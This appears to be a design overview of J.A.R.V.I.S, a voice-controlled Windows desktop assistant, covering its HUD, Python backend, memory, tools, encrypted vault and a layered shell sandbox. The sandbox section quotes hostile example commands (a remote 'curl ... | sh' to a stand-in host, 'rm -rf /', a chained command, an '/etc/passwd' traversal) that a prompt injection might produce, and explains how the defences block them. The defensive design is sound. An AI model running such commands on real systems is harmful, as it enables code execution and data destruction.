1. WHAT IS J.A.R.V.I.S, IN ONE PARAGRAPH
----------------------------------------

J.A.R.V.I.S is a voice-first AI assistant for Windows. You speak, it listens.
It thinks (powered by a fast cloud LLM called Groq Llama 3.1). It speaks
back to you with a smooth, British-accented voice. It remembers your past
conversations. It can see your screen if you ask it to. It can run safe
shell commands, search the web, generate Word and PDF documents, and store
your sensitive files inside an encrypted vault that nobody — not even
J.A.R.V.I.S himself — can read without your master password. The whole
thing runs as a single desktop app, with a cinematic holographic-style
interface inspired by the JARVIS from the Marvel films.


2. WHAT CAN IT ACTUALLY DO? (A TOUR)
------------------------------------

Imagine sitting at your computer and saying out loud:

  "JARVIS, what's the CPU temperature on this machine?"

J.A.R.V.I.S hears you. A glowing orange particle blob in the centre of
your screen reacts to your voice. The screen shows your words being
transcribed in real time. The blob pulses, indicating the assistant is
thinking. Within half a second, J.A.R.V.I.S starts speaking — not waiting
to compose the whole answer first, but talking as the words are being
generated, in parallel. The HUD shows the text appearing word-by-word in
a glassmorphic chat panel.

Other things you can ask:

  - "What time is it?"
  - "Search the web for the latest news on Llama 4."
  - "What's the weather in Mumbai right now?"
  - "Read the file backend/main.py and tell me what it does."
  - "Look at my screen — what do you see?"
  - "Export our conversation as a PDF."
  - "Translate this Hinglish: 'mujhe yeh code samajh nahi aa raha hai'."
  - "Search the workspace for all Python files containing the word 'sandbox'."
  - "Wipe your memory."
  - (Click NEXUS tab) "Upload my passport scan, encrypted."

And J.A.R.V.I.S will:
  - Speak the answer aloud (high-quality neural text-to-speech).
  - Show the typed answer on the HUD.
  - Display a memory indicator if it pulled context from past chats.
  - Display a vision indicator if it captured your screen.
  - Display a tool-use indicator with the exact tool name (e.g.,
    "EXECUTE_TERMINAL_COMMAND", "WEB_SEARCH").
  - Show live CPU/RAM telemetry in the corner.


3. HOW IS IT DIFFERENT FROM CHATGPT OR SIRI?
---------------------------------------------

ChatGPT lives in a web browser tab. Siri is locked into the Apple
ecosystem and doesn't see your screen or run code. J.A.R.V.I.S is
DIFFERENT in five concrete ways:

  (a) It's a NATIVE DESKTOP APP. One double-click on the icon and it
      launches — no browser, no login.

  (b) It SEES YOUR SCREEN. Ask it about a complex diagram or a tricky
      stack trace and it takes a screenshot, sends it through a vision
      model, and answers based on what's actually on your monitor.

  (c) It REMEMBERS YOU between sessions. Every conversation is embedded
      into a local vector database (ChromaDB) with timestamps. When you
      ask "what was that library you mentioned last week?", it actually
      knows.

  (d) It HAS A LOCAL ENCRYPTED VAULT (NexusVault). Drag files into the
      vault, set a master password, and they're encrypted with AES-256-GCM
      — the same cipher used by banks and military systems. The password
      is never stored anywhere; only YOU can decrypt your files.

  (e) It RUNS SHELL COMMANDS SAFELY. ChatGPT can't touch your filesystem
      or run "ls". J.A.R.V.I.S can — but only commands on an explicit
      allow-list, inside a sandboxed environment that limits CPU, memory,
      network access, and lifetime. If a command runs amok, the sandbox
      kills it.


4. WHO IS IT FOR?
-----------------

This project was built as a personal, premium-quality desktop assistant.
The target user is someone who:

  - Lives on Windows (10 or 11).
  - Wants the cinematic Marvel-JARVIS experience without compromise.
  - Needs an assistant that respects local privacy — most data stays on
    your machine, only LLM inference and weather/web search go to the
    cloud.
  - Wants to extend the assistant easily (add new tools, swap STT/TTS
    engines, etc.).
  - Cares about clean engineering — every piece of the system is testable,
    debuggable, and documented.

5. THE ARCHITECTURE IN PLAIN ENGLISH
-------------------------------------

Think of J.A.R.V.I.S as two halves stitched together:

  THE FRONT (the HUD)                 THE BACK (the brain)
  ------------------                  --------------------
  Written in React + Three.js         Written in Python + FastAPI
  Runs in a browser-like window       Runs as a server on port 8000
  Handles drawing, animation,         Handles thinking, remembering,
  taking your voice input             speaking, running tools
  No "intelligence" of its own        Talks to the LLM (Groq), the
  Just shows + sends + receives       database (ChromaDB), the TTS
                                      service, and the sandbox

The two halves talk to each other through a WebSocket — a persistent
two-way connection that stays open the whole time the app is running.
Through that connection flows:

  - Your typed/spoken text (HUD -> brain)
  - Streaming text response tokens (brain -> HUD, one chunk at a time)
  - Streaming audio MP3 frames (brain -> HUD, played in real time)
  - Status events ("memory active", "vision active", "running tool X")
  - Heartbeats every 15 seconds to detect dead connections
  - Telemetry every 5 seconds (CPU/RAM/disk usage)

The genius of this design: the HUD has ZERO intelligence. It can't think.
It only renders. All the AI lives in the Python brain. This means:
  - You can swap the HUD for a different interface (CLI, mobile, etc.)
    and the brain doesn't care.
  - You can swap the brain (move to a different LLM provider) and the
    HUD doesn't care.
  - The two halves can be developed independently and tested
    independently.


5A. A DAY IN THE LIFE — ONE VOICE COMMAND TRACED END-TO-END
------------------------------------------------------------

Forget abstractions for a moment. Let's trace exactly what happens, in
real time, when you say into your microphone:

    "JARVIS, what's the weather in Mumbai?"

The timeline below is in milliseconds from the moment your last syllable
leaves your mouth. Numbers are realistic on a 100 Mbit home connection
with a decent CPU. Every arrow corresponds to a real function call in
the codebase.

  t = 0 ms      Your voice hits the laptop's microphone.

  t = 0–20 ms   The browser's AudioContext (managed by useSpeech.js)
                buffers the PCM samples. A voice-activity-detection
                window decides the utterance is complete after ~600 ms
                of silence at the tail. We pretend that 600 ms is t=0.

  t = 20 ms     The HUD POSTs the audio blob to /process-audio on the
                FastAPI server (port 8000).

  t = 60 ms     FastAPI hands the bytes to stt_service.py. It tries the
                cloud path first: Groq Whisper Large V3 Turbo.

  t = 350 ms    Groq returns the transcription:
                   "what's the weather in mumbai"
                If the cloud were down, stt_service would have failed
                over to local Vosk at ~700–900 ms instead.

  t = 360 ms    The transcription is dispatched into the WebSocket
                handler in main.py as if you'd typed it. The handler
                calls JarvisProcessor.stream_llm(text).

  t = 370 ms    stream_llm starts by querying JarvisMemory (ChromaDB).
                It embeds your sentence with the default Sentence-
                Transformers model, then searches for the top-3 most
                similar past conversations. Even on a cold DB this
                returns in ~30 ms.

  t = 400 ms    Memory returned context like "user previously asked
                about Mumbai weather on 2026-05-15". stream_llm yields:
                   { "kind": "event",
                     "name": "memory", "state": "active" }
                The WebSocket layer wraps it as a structured frame
                and sends it to the HUD. The HUD lights up a small
                "memory active" pip in SystemStatus.

  t = 420 ms    stream_llm assembles the full prompt:
                  [system prompt] +
                  [memory snippet] +
                  [last 12 conversation turns] +
                  [your current question]
                and calls Groq's chat.completions.create() with the
                12-tool function-calling spec attached. Pass 1.

  t = 680 ms    Groq returns its decision: a function call.
                  name:      "get_weather"
                  arguments: { "location": "Mumbai" }

  t = 690 ms    stream_llm yields a tool_lifecycle:start event for the
                HUD. The HUD shows "TOOL: get_weather" in its console.

  t = 700 ms    The tool dispatcher in tool_registry.py invokes
                _h_get_weather("Mumbai"). The handler calls the
                duckduckgo-search package.

  t = 1050 ms   DuckDuckGo returns:
                  "Mumbai: 32°C, partly cloudy, humidity 71%, wind
                   12 km/h SW. Light rain expected after 8pm."

  t = 1055 ms   tool_lifecycle:end event yielded. HUD console clears.

  t = 1060 ms   stream_llm starts Pass 2: feeds the tool result back
                to Groq with a "compose a natural-language answer"
                instruction.

  t = 1080 ms   First token arrives from Groq's stream:
                   { "kind": "token", "data": "Currently" }
                The HUD's BrainTerminal appends it to the chat panel.
                Concurrently, the token is added to a TTS chunk buffer.

  t = 1080 ms   Once the chunk buffer crosses a punctuation boundary
                (~one sentence), tts_service.py kicks off Edge TTS
                with the chunk and starts streaming MP3 frames back
                through the WebSocket as binary messages.

  t = 1200 ms   The HUD's TTSService queues the first MP3 chunk and
                starts decoding+playing via Web Audio. The 3D blob
                pulses in time with the audio amplitude.
                  >>> The user starts HEARING the answer here. <<<

  t = 1080–    Groq continues streaming tokens. New tokens are
       1800 ms appended to BrainTerminal in real time. New TTS
                chunks are produced for each sentence boundary. New
                MP3 frames arrive at the HUD and are queued behind the
                currently-playing one.

  t = 1900 ms   Final token arrives. stream_llm yields response_end:
                   { "type": "response_end",
                     "data": "Currently in Mumbai..." (full text) }
                JarvisMemory.store() persists the (question, answer)
                pair with a timestamp into ChromaDB.

  t = 1900–    The HUD continues playing queued MP3 chunks for as
       3500 ms long as it takes Edge TTS to produce + transmit + the
                browser to play out the full answer. During this
                window, the mic stays muted (audio queue not empty).

  t = 3500 ms   The TTSService 100 ms polling monitor finally observes
                  isPlaying === false  AND  audioQueue.length === 0
                It sets isSpeaking(false) and the useSpeech hook
                re-arms the microphone. J.A.R.V.I.S is now listening
                again for your next command.

THE WHOLE LOOP, INCLUDING SPEECH SYNTHESIS, IS UNDER 1.5 SECONDS to
first-spoken-word — which is the perceptual threshold for "feels
instantaneous." That is the design target. Every architectural choice
in the system (Groq's LPU hardware, streaming token-by-token, parallel
TTS, single-process FastAPI singleton, no cold start) exists to defend
that 1.5-second budget.

Things to notice in the trace:

  - The user perceives the system as "fast" not because any one piece
    is fast, but because text-output and audio-playback happen IN
    PARALLEL with LLM generation. We never wait for "the whole answer"
    before doing the next step.

  - The "memory active" indicator fires BEFORE the LLM has produced a
    single word. The HUD acknowledges that it understood the question
    before it answers it. This is a deliberate UX choice — it makes the
    assistant feel alive even when the LLM takes longer than usual.

  - The tool call adds ~400 ms of latency. For some tools that's
    acceptable (a weather lookup IS slow). For others (purge_memory,
    get_time_and_date) the tool itself completes in microseconds and
    the perceived latency is identical to a tool-less answer.

  - The mic stays muted from t=1080 ms (audio_start frame arrives) to
    t=3500 ms (audio queue drained). For 2.4 seconds J.A.R.V.I.S
    cannot hear you. If you try to interrupt him mid-answer, your
    voice is dropped. (Adding barge-in is a planned upgrade — U-15
    territory.)

  - If at ANY point the WebSocket drops (Wi-Fi blip, sleep/resume),
    the HUD's exponential-backoff reconnect kicks in and the
    in-progress generation is abandoned. The conversation history is
    NOT corrupted — partial responses are not stored.


6. THE HUD (WHAT YOU SEE ON SCREEN)
-----------------------------------

The HUD is built in React 19 with Three.js for 3D rendering. Visually,
it's organised around a glowing 3D particle blob in the centre — the
"neural core" — that reacts in real time to:

  - Your microphone input (it swells when you speak).
  - J.A.R.V.I.S's voice output (it pulses when he speaks).

Around the blob there are panels:

  - SystemStatus -- a live HUD bar showing whether J.A.R.V.I.S is
    listening, thinking, speaking, or observing your screen. Also shows
    backend connection state + CPU/RAM telemetry.

  - BrainTerminal -- the streaming chat panel. Text appears word-by-word
    as J.A.R.V.I.S generates it. URLs are auto-detected and rendered as
    clickable links.

  - VoiceControl -- your live transcript while you're talking. Shows the
    pipeline state (idle / listening / thinking / speaking).

  - SystemConsole -- a technical log feed for debugging (connection
    events, errors, memory hits).

  - TranslationTerminal -- shown when J.A.R.V.I.S translates something.

  - NexusVault -- a dedicated tab for the encrypted file storage UI.

  - Navbar -- top-level navigation (HOME / CORE / NEXUS tabs), settings
    dropdown for the blob (color, size, sensitivity), and the
    INITIALIZE/STOP buttons.

  - SplashScreen / Hero -- boot animation and welcome screen.

The look-and-feel philosophy is "advanced glassmorphism": every panel
feels like it's projected onto a glass surface, with subtle blur, glow,
and motion. The color palette defaults to a warm orange (the JARVIS
signature), but is customisable.


7. THE BRAIN (THE PYTHON CORE)
------------------------------

The brain is a FastAPI application that runs on port 8000 by default.
It boots up once and stays running. Inside it there's a singleton
object called JarvisProcessor -- created at startup, lives for the
whole session -- which is the orchestrator. JarvisProcessor stitches
together:

  - Groq client -- for talking to the LLM and the vision model.
  - JarvisMemory -- wraps ChromaDB for long-term semantic recall.
  - JarvisVision -- captures the screen and asks the vision model.
  - ToolContext -- the bag of services passed to each tool handler.
  - Vosk model -- for offline speech-to-text fallback.

When you say something, here's what happens inside the brain:

  1. The text arrives via the WebSocket.
  2. JarvisProcessor.stream_llm(text) is called.
  3. It adds your message to the rolling conversation history.
  4. It queries ChromaDB for related past memories.
  5. If memory found, it yields a "memory" event so the HUD lights up.
  6. It assembles the prompt (system message + memory + history + your turn).
  7. It calls Groq in TWO passes:
     Pass 1: "Should we use a tool for this? Here are the available tools."
             Groq returns a decision (use_tool or just_answer).
     Pass 2: If a tool was chosen, run it, then ask Groq to compose the
             final answer using the tool's result. Otherwise, just stream
             the answer directly.
  8. Each word generated by Groq is yielded as a "token" event.
  9. Once the full response is composed, it's stored back into ChromaDB
     so the next conversation can recall it.

While all that text streaming is happening, in PARALLEL:

  10. The Edge TTS service is called with the same text.
  11. It produces MP3 audio frames.
  12. Those frames are sent as binary WebSocket messages to the HUD.
  13. The HUD queues them, plays them in order, and shows the blob
      pulsing in sync.

The parallelism is what makes J.A.R.V.I.S feel "alive" -- text and voice
arrive together, with near-zero perceived latency.


8. THE VOICE LOOP (HEARING & SPEAKING)
---------------------------------------

HEARING (Speech-to-Text):

  J.A.R.V.I.S has TWO STT engines in a failover configuration:

  - PRIMARY: Whisper Large V3 Turbo, running on Groq's cloud. This is
    fast and accurate, but requires internet.

  - FALLBACK: Vosk, running locally on your machine. Slower and less
    accurate, but works offline. Auto-activates if the cloud call fails.

  The HUD uses your browser's native getUserMedia API to capture the
  microphone. If you're on HTTPS or localhost, this works seamlessly.
  If you're on an insecure HTTP context (which browsers block for
  privacy), J.A.R.V.I.S detects it and shows a friendly error rather
  than crashing.

SPEAKING (Text-to-Speech):

  J.A.R.V.I.S uses Microsoft Edge's neural TTS engine with the
  "RyanNeural" voice -- a smooth, British-accented male voice that
  matches the Marvel-JARVIS character. The text-to-MP3 streaming
  produces audio in chunks, sent to the HUD as binary WebSocket frames.

  CRITICAL DETAIL: J.A.R.V.I.S has to be careful not to hear himself
  speaking. If the microphone stays unmuted while the speakers are
  playing his voice, the STT engine will transcribe his own words,
  which will be sent back to him as a new prompt -- creating an INFINITE
  LOOP. This is called the "self-talk" problem.

  The solution is a 100-millisecond polling monitor in the HUD that
  checks TWO conditions:
     (a) The audio currently playing has finished (isPlaying === false)
     (b) The audio queue is fully drained (audioQueue.length === 0)

  Only when BOTH are true does the mic re-arm. This is load-bearing
  code -- if you remove it, J.A.R.V.I.S talks to himself forever.


9. LONG-TERM MEMORY (HOW IT REMEMBERS YOU)
-------------------------------------------

J.A.R.V.I.S uses a technique called RAG (Retrieval-Augmented Generation).
Here's how it works in plain English:

  - Every conversation turn (your question + J.A.R.V.I.S's answer) is
    saved as a "document" in a local database called ChromaDB.

  - Each document is embedded as a vector -- a list of numbers that
    captures its semantic meaning. Similar meanings produce similar
    vectors, even if the words are different.

  - When you ask a new question, J.A.R.V.I.S embeds YOUR question too,
    then searches the database for past documents with similar vectors.

  - The top 3 most similar past memories are pulled into the new prompt
    as context.

  - This means J.A.R.V.I.S can recall things like:

       You (last week)   : "I'm working on a FastAPI project."
       You (today)       : "What was that web framework I mentioned?"
       J.A.R.V.I.S       : "You mentioned FastAPI last week, sir."

  The database lives at backend/memory_db/ and persists across restarts.
  Every memory has a timestamp, so J.A.R.V.I.S can distinguish "the
  thing you said last week" from "the thing you said today".

  If the database gets too big or corrupted, it auto-rebuilds. You can
  wipe it entirely by saying "JARVIS, purge your memory."

  There's also a SHORT-term memory: the last 12 messages of the current
  conversation, kept in RAM. If the conversation goes past 12 messages,
  the oldest 6 are auto-summarised by the LLM into a single sentence and
  stored as a condensed summary, so context isn't lost but the prompt
  doesn't blow up.


10. THE TOOL SUITE (WHAT J.A.R.V.I.S CAN DO)
---------------------------------------------

J.A.R.V.I.S has 12 registered tools. The LLM is told about them via
Groq's function-calling API. When you ask something, the LLM decides
which tool (if any) to invoke. Each tool has:

  - A name
  - A description
  - A JSON schema for its arguments
  - A Python function that runs it

The 12 tools:

  1.  get_system_status
        -- Returns CPU%, RAM%, disk usage% via psutil.

  2.  get_time_and_date
        -- Returns the local date/time formatted humanely.

  3.  get_platform_info
        -- Returns the OS, architecture, and Python version.

  4.  purge_memory
        -- Wipes the entire ChromaDB collection. Confirmation expected.

  5.  analyze_screen   [VISION TOOL]
        -- Takes a screenshot, sends it + your question to Groq Llama 3.2
           Vision, returns the answer.

  6.  execute_terminal_command   [SANDBOXED]
        -- Runs an allow-listed shell command inside the sandbox (see s.12).

  7.  create_file
        -- Creates a UTF-8 text file inside the project sandbox.

  8.  search_files
        -- Globs the sandbox for files matching a pattern.

  9.  read_file
        -- Reads a UTF-8 file from the sandbox (max 1 MiB).

  10. web_search
        -- DuckDuckGo text search.

  11. get_weather
        -- DuckDuckGo weather lookup for a location.

  12. export_conversation
        -- Generates a PDF or DOCX of the entire conversation history.
           Lazy-imports fpdf / python-docx to keep cold start fast.

Adding a new tool is dead simple: write a handler function, append a
Tool(...) entry to the _TOOLS tuple in tool_registry.py -- and it's
auto-registered, auto-discovered, auto-exposed to Groq.


11. NEXUSVAULT (THE ENCRYPTED FILE VAULT)
------------------------------------------

NexusVault is a zero-knowledge encrypted file store. "Zero-knowledge"
means the server NEVER knows your master password. Here's the exact
flow:

  SETUP (first time)
    - You click the NEXUS tab in the HUD.
    - You see a "vault not initialised" screen.
    - You enter a master password (at least 6 characters).
    - The server creates an empty encrypted index file at
      <repo>/vault/index.enc.
    - The password is used ONCE to derive a key (via PBKDF2-HMAC-SHA256
      with 100,000 iterations), encrypt the empty index, and then the
      password is discarded from memory.

  UPLOAD
    - You drag a file into the dropzone.
    - The HUD sends the file bytes + your password to /api/nexus/upload.
    - The server:
        - Derives a key from your password (with a fresh random 16-byte salt).
        - Generates a fresh random 12-byte IV.
        - Encrypts the file with AES-256-GCM (authenticated encryption).
        - Stores the result at <repo>/vault/<uuid>.enc with layout:
            SALT (16 bytes) || IV (12 bytes) || CIPHERTEXT || TAG
        - Updates the encrypted index registry with the file's metadata
          (name, size, MIME type, timestamp).
        - Discards your password.

  DOWNLOAD
    - You click the download icon next to a file in the vault.
    - The HUD prompts (silently -- the password is already in memory
      from when you unlocked) and sends password + UUID to /api/nexus/download.
    - The server:
        - Re-derives the key from your password + the stored salt.
        - Decrypts and validates the GCM auth tag.
        - If the tag is invalid (wrong password OR tampered file),
          raises a ValueError -> HTTP 401.
        - On success, streams the plaintext back to the browser as a
          downloadable blob.

  DELETE (Secure Shred)
    - The file is OVERWRITTEN with cryptographically random bytes the
      same length as the original.
    - f.flush() + os.fsync() force the overwrite to hit storage hardware.
    - Then the file is unlinked.
    - The index entry is removed.
    - This is best-effort on SSDs (wear-levelling can leave ghost copies
      on the physical NAND), but it's the strongest software-level shred
      possible without full-disk encryption.

  IF YOU FORGET YOUR PASSWORD
    - Your files are gone forever. The encryption is mathematically
      one-way without the password. This is the POINT of zero-knowledge.

The cryptographic primitives:
  - Algorithm     : AES-256-GCM (NIST-approved, banking-grade)
  - KDF           : PBKDF2-HMAC-SHA256, 100,000 iterations
  - Salt          : 16 bytes, fresh random per encryption
  - IV            : 12 bytes, fresh random per encryption
  - Auth tag      : 16 bytes, embedded in the GCM ciphertext

The HTTP routes (mounted at /api/nexus/* in backend/nexus_routes.py):

  GET  /api/nexus/status      -> { initialized: bool }
  POST /api/nexus/initialize  -> create vault with new password
  POST /api/nexus/files       -> list files (also acts as unlock check)
  POST /api/nexus/upload      -> encrypt + store
  POST /api/nexus/download    -> decrypt + stream
  POST /api/nexus/delete      -> secure shred

HTTP status mapping:
  401 wrong password / tampered ciphertext
  404 file UUID not in registry
  409 vault already initialised (no clobber)
  413 upload > 100 MiB


12. THE SANDBOX (THE EXECUTE_TERMINAL_COMMAND STORY)
-----------------------------------------------------

This is one of the most carefully-engineered parts of J.A.R.V.I.S, so
it deserves its own section.

THE PROBLEM:
  J.A.R.V.I.S has a tool called execute_terminal_command. The LLM can
  decide to call it with any string ("ls", "git status", etc.). If we
  just blindly run subprocess.run(command, shell=True) -- which is what
  many AI agents do -- we've handed the LLM (and anyone who can prompt
  the LLM) keys to the kingdom. Prompt injection becomes a remote-code-
  execution exploit.

THE LAYERED DEFENCE:

  LAYER 1: ALLOW-LIST.
    Only specific binaries can be invoked. The full allow-list lives in
    core/security.py:
      Filesystem  : ls, dir, pwd, cd, echo, cat, type
      Dev tooling : git, node, npm, python, pip
      Identity    : whoami, hostname
      Time        : date, uptime
      System      : uname, tasklist, ps
      Network     : ipconfig, ifconfig, ping
      Lookup      : where, which
    Anything else is rejected immediately with "Blocked: not on allow-list".

  LAYER 2: SHELL METACHARACTERS FORBIDDEN.
    Even if a binary IS on the allow-list, we deny any command containing
    `;` `&` `|` backtick `$` `>` `<` newlines, `&&`, `||`, or `$(...)`.
    This kills command chaining, command substitution, and redirection.
    The command MUST be a single binary with its args, no pipes, no
    redirects.

  LAYER 3: NO SHELL INTERPRETATION.
    We use subprocess.Popen with shell=False. The string is parsed by
    shlex (POSIX-safe) and passed as an argv array directly to the OS.
    The shell is never involved, so even if a metachar slipped through,
    nothing would interpret it.

  LAYER 4: THE SANDBOX BACKEND.
    The actual subprocess runs inside ONE of three execution backends,
    selected at runtime. This is the headline v3.2 feature:

    Backend A -- DOCKER (most secure):
       docker run --rm --network=none --read-only \
                  --cpus=0.5 --memory=256m --pids-limit=64 \
                  --workdir /work --volume <run_dir>:/work:ro \
                  <image> <argv>
       The command has no network, can't write to disk (read-only),
       can use at most half a CPU, 256 MiB of RAM, and 64 processes.
       When the container exits, everything is gone. Requires Docker
       Desktop running.

    Backend B -- WINDOWS JOB OBJECT (default on Windows):
       Uses the pywin32 library to create a Windows Job Object -- a
       kernel-level container -- with these limits:
         - KILL_ON_JOB_CLOSE: if the parent (JARVIS) dies, kill all
           processes in the job.
         - PerProcessUserTimeLimit: CPU time cap (~ wall-clock timeout).
         - ProcessMemoryLimit: 256 MiB.
         - ActiveProcessLimit: 16 (defeats fork bombs).
       The subprocess is spawned with CREATE_NEW_PROCESS_GROUP and
       assigned to the Job Object via AssignProcessToJobObject.

    Backend C -- HARDENED SUBPROCESS (universal fallback):
       Plain subprocess.run with the following hardening:
         - shell=False
         - env scrubbed to a whitelist (SYSTEMROOT, WINDIR, COMSPEC,
           PATHEXT, TEMP, TMP, locales, USERNAME) -- nothing else gets
           inherited, in particular GROQ_API_KEY isn't leaked to the
           child.
         - PATH replaced with a restricted system-only path.
         - CWD locked to <repo>/.sandbox_run/ (a dedicated scratch dir).
         - Hard wall-clock timeout.
         - Output capped at 2000 bytes (excess truncated with "[truncated]").
         - On Windows: CREATE_NEW_PROCESS_GROUP.
         - On POSIX: start_new_session=True.

    Selection is automatic:
      - JARVIS_SANDBOX_BACKEND env var overrides everything.
      - Otherwise: windows_jobobject if pywin32 is available on Windows,
        else hardened.

  LAYER 5: OUTPUT REDACTION.
    Whatever output the command produces is passed through redact()
    before being sent back, which masks Groq API keys, OpenAI/generic
    API keys, and anything matching api_key/token/secret patterns. This
    way, even if a command accidentally prints a secret, it's redacted
    in the LLM's context (so the LLM can't be tricked into re-emitting
    it) and in any logs that capture it.

  LAYER 6: ALLOW-LIST RE-VALIDATION INSIDE THE SANDBOX.
    The caller can't bypass the allow-list by calling the sandbox
    directly -- the sandbox re-runs is_command_allowed() before doing
    anything. The allow-list is the source of truth.

The net effect: even if someone prompt-injects J.A.R.V.I.S into running
"rm -rf /" or "curl http://evil.com | sh", the layers stop it cold:
  - "rm" not on allow-list -> blocked.
  - "curl" not on allow-list -> blocked.
  - "ls; rm -rf /" -> metacharacter -> blocked.
  - Even if it WAS on the allow-list, the sandbox would kill it on
    timeout and refuse network access (Docker backend).


13. THE NEURAL LINK (HOW THE HUD AND BRAIN TALK)
-------------------------------------------------

The WebSocket at /ws is a persistent two-way pipe. Here's exactly what
goes through it.

INBOUND (from the HUD to the brain) -- all JSON:

  { "type": "chat", "text": "..." }           -- your message
  { "type": "clear_history" }                 -- wipe rolling window
  { "type": "ping", "timestamp": 12345 }      -- heartbeat

OUTBOUND (from the brain to the HUD) -- JSON or binary:

  JSON event types:

    { "type": "status", "data": "thinking"|"speaking"|"idle" }
    { "type": "token", "data": "<one word or chunk>" }
    { "type": "response_end", "data": "<full text>" }
    { "type": "audio_start" }
    { "type": "telemetry", "data": { "cpu": 23.4, "ram": 67.1, "status": "nominal" } }
    { "type": "pong", "timestamp": 12345 }
    { "type": "error", "data": "<sanitised message>" }
    { "type": "tool_lifecycle", "state": "start"|"end", "name": "WEB_SEARCH" }
    { "type": "memory", "state": "active" }
    { "type": "vision", "state": "start"|"end" }

  Binary frames: raw MP3 audio chunks (one or more per response).

WHY ARE tool_lifecycle / memory / vision SEPARATE FRAMES?

  In an earlier version of J.A.R.V.I.S, those events were embedded
  INSIDE the token stream as sentinel strings like `[TOOL_START:NAME]`
  or `[MEMORY_ACTIVE]`. The HUD had to parse the text stream looking for
  these markers. This was fragile:
    - If the LLM ever output the literal string `[TOOL_START:HACK]` as
      part of a normal response (e.g., when explaining JARVIS's
      protocol), the HUD would interpret it as a real tool event.
    - The HUD had to mix rendering logic with parsing logic.
    - Changing the protocol risked breaking displayed text.

  In v3.2 these were promoted to proper structured frames. The token
  stream now contains ONLY text, and control flows as dedicated JSON.
  Cleaner, safer, future-proof.

WHY ARE BINARY AND JSON SERIALISED THROUGH AN ASYNCIO LOCK?

  WebSockets allow interleaving. If the server tries to send a JSON
  frame at the same time it's sending an MP3 chunk, the bytes can
  intermix on the wire, producing corrupt audio AND corrupt JSON. Every
  send is wrapped in `async with ws_lock:` so no two writes are ever
  interleaved.

HEARTBEAT & RECONNECTION:

  The HUD pings the brain every 15 seconds. If no pong arrives within
  5 seconds, the connection is declared dead and force-closed. The HUD
  then schedules a reconnect with exponential backoff:
    - Start at 500ms.
    - Multiply by 1.5 on each failure.
    - Cap at 10 seconds.
    - Add +/-30% random jitter (prevents thundering herd).
    - Reset to 500ms on a successful connect.
    - NEVER give up (MAX_RECONNECT_ATTEMPTS = Infinity).

  In addition, the HUD watches for:
    - Tab refocus (visibilitychange event) -> immediate reconnect.
    - Network restoration (online event) -> immediate reconnect.
    - HTTP /health probe every 30 seconds as fallback diagnostic.

OUTBOUND TELEMETRY:

  Every 5 seconds, a `{ "type": "telemetry", ... }` frame is sent with
  current CPU% and RAM%. If the rolling-window CPU average exceeds 90%
  for 30 seconds, J.A.R.V.I.S also injects a token like
  "[SYSTEM ALERT]: Sustained CPU spike over the last 30 seconds, sir."
  into the text stream -- so the HUD's speaking voice can warn you out
  loud.

17. THE SEVEN SECURITY PILLARS
-------------------------------

  1. ALLOW-LIST SHELL EXECUTION
     Only explicitly-named binaries. Anything else: blocked.

  2. SHELL METACHARACTER REJECTION
     Even allowed binaries cannot chain, pipe, or redirect.

  3. SANDBOX ISOLATION (3-tier)
     Every shell command runs inside Docker / Job Object / hardened
     subprocess -- never on the bare host.

  4. PATH-TRAVERSAL GUARD
     File tools call resolve_within_sandbox() which canonicalises the
     path with Path.resolve() BEFORE the containment check. You can't
     smuggle `../../../etc/passwd` past it.

  5. SECRET REDACTION
     All command output, all error messages, all logs flow through
     redact() which masks Groq keys (`gsk_*`), OpenAI/generic keys
     (`sk-*`), and `api_key|token|secret` patterns.

  6. CORS NON-WILDCARD
     ALLOWED_ORIGINS is an explicit list. No `*`. Mobile testing
     requires adding the LAN IP explicitly.

  7. ZERO-KNOWLEDGE VAULT
     NexusVault master password is never stored, never transmitted to
     any server beyond the local backend, never persisted. Forgetting
     it is permanent data loss -- that's the point.


18. THE "SELF-TALK" PROBLEM AND HOW WE SOLVED IT
-------------------------------------------------

Already discussed in s.8 but worth repeating because it's such a great
illustration of how subtle real-time AI systems are.

THE NAIVE APPROACH (what doesn't work):
  When the server sends `{ "type": "status", "data": "idle" }` saying
  "I'm done streaming audio", the HUD unmutes the microphone.

WHY IT FAILS:
  The server's status frame means "I'm done UPLOADING audio bytes."
  But the browser still has 200-800 ms of MP3 data buffered, decoded,
  and queued for the speakers. While that buffer drains, the mic is
  open, the STT engine is listening, and J.A.R.V.I.S transcribes his
  own voice -- feeding it back to himself as a new prompt.

THE FIX (load-bearing):
  Client-side completion authority. The side that owns the speaker
  must be the one that decides when speech is done. We poll every
  100 ms in useBrain.js:

      if (!TTSService.isPlaying() && TTSService.audioQueue.length === 0) {
        // Both conditions: nothing playing AND queue empty.
        // NOW it's safe to unmute the mic.
        setIsSpeaking(false);
      }

The conjunction is essential. `isPlaying() === false` alone gives
false positives between two consecutive buffers (the source node
briefly reports "not playing"). `audioQueue.length === 0` alone
isn't enough because the last queued buffer might still be rendering.
Both together = "no audio in flight, anywhere."

There's also a server-side helper: J.A.R.V.I.S sends `audio_start`
at the BEGINNING of the audio stream and `idle` at the END. The HUD
sets `isDownloadingAudio = true` between them so the polling loop
doesn't fire while audio is still ARRIVING.


19. BOOT-TIME SAFETY GUARDS
----------------------------

The backend refuses to start in dangerous configurations:

  GUARD 1: GROQ_API_KEY VALIDATION
    Reads the env var at startup. If missing OR equal to the placeholder
    string "gsk_your_key", raises RuntimeError before the FastAPI app is
    even constructed. The server cannot boot accidentally without a real
    API key.

  GUARD 2: CORS NON-WILDCARD ENFORCEMENT
    Default ALLOWED_ORIGINS is "http://localhost:3000". If you want to
    test from another machine on your LAN, you MUST set the env var
    explicitly. There is no `allow_origins=["*"]` shortcut.

  GUARD 3: INBOUND TEXT CLAMP (4000 chars)
    Anything you type/say is truncated to 4000 characters before being
    sent to the LLM. This bounds the per-turn token cost and prevents
    prompt-flooding attacks.

  GUARD 4: AUDIO UPLOAD CAP (25 MiB)
    The /stt and /process-audio endpoints reject larger uploads with a
    413. Protects against memory exhaustion via large audio files.

  GUARD 5: VAULT UPLOAD CAP (100 MiB)
    Same idea, scaled to vault use case.

  GUARD 6: WEBSOCKET WRITE LOCK
    Every send through the WebSocket -- JSON or binary -- is serialised
    through an asyncio.Lock so no two writes can interleave. Without
    this, JSON frames and MP3 audio could intermix on the wire.


20. WHAT HAPPENS WHEN THINGS GO WRONG (THE RESILIENCE STORY)
-------------------------------------------------------------

J.A.R.V.I.S is designed to gracefully handle:

  - Internet drops      -> STT failover to local Vosk; LLM call fails
                           gracefully with a fallback sentence; WS
                           reconnects with exponential backoff.

  - Backend crash       -> HUD detects via heartbeat (15s ping / 5s
                           pong timeout); reconnects; if backend stays
